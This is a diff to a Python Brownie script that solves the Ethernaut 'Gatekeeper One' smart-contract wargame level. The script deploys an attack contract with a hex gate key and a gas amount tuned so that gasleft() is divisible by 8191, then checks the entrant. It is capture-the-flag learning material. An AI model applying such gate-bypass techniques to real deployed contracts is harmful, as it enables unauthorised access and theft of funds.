@@ -8,7 +8,7 @@ GATE_HEX = "eE25"
 
 GAS_LIMIT = 6000000
 
-# need to figure out exact gas amount to leave 8191
+# need to figure out exact gas amount to leave -> gasleft() % 8191 == 0
 GAS_AMOUNT = 0
 
 
@@ -17,17 +17,20 @@ def main():
     player = get_account()
     attack = Attack13.deploy(ETHERNAUT_INSTANCE, {"from": player})
     target = interface.IGatekeeperOne(ETHERNAUT_INSTANCE)
+    entrant = target.entrant({"from": player})
+    print(f"Entrant is {entrant}")
 
-    gate_key = int(GATE_HEX, 16)
+    gate_key = int(GATE_HEX, 16)  # gate_key = 60965
+    print(f"Gate Key = {gate_key}")
 
     attack.attack(
-        gate_key,""
+        gate_key,
         GAS_AMOUNT,
         {"from": player, "gas_limit": GAS_LIMIT, "allow_revert": True},
     )
 
-    # check that we've won by confirming that 'entrant' = player
-    print(f"Entrant is {target.entrant()}")
+    # # check that we've won by confirming that 'entrant' = player
+    # print(f"Entrant is {target.entrant()}")
 
 
 # bytes    uint
